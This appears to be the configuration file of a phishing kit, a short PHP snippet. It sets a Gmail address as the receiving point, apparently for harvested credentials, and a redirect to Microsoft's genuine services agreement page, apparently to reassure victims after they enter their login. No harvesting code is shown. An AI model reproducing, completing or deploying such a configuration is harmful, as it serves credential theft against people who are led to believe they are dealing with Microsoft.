<?php 
$Receive_email="centromarinasa@gmail.com";
$redirect="https://www.microsoft.com/en-US/servicesagreement/";
?>